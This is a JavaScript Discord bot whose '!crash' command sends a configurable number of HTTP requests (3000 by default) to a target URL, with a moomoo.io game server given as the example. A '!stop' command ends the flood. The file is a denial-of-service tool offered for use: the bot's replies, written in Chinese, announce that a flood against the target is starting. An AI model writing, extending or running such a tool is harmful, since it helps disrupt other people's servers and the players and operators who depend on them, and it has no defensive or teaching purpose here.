const { Client, GatewayIntentBits } = require('discord.js');
const { flood, stopFlood } = require('./flood');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ]
});

const PREFIX = '!';

client.on('messageCreate', async msg => {
  if (msg.author.bot) return;
  if (!msg.content.startsWith(PREFIX)) return;

  const [cmd, ...args] = msg.content.slice(PREFIX.length).split(/\s+/);

  if (cmd === 'crash') {
    const url = args[0];
    if (!url || !url.startsWith('http')) {
      return msg.reply('格式: !crash https://xxx.moomoo.io/ping/');
    }
    const count = parseInt(args[1]) || 3000;
    await msg.reply(`⏳ 開始 flood ${url} (${count} req)...`);
    flood(url, count);
  } else if (cmd === 'stop') {
    if (stopFlood()) {
      msg.reply('⛔ 已停止 flood');
    } else {
      msg.reply('目前沒有正在執行的 flood');
    }
  }
});

client.login(process.env.DISCORD_TOKEN);
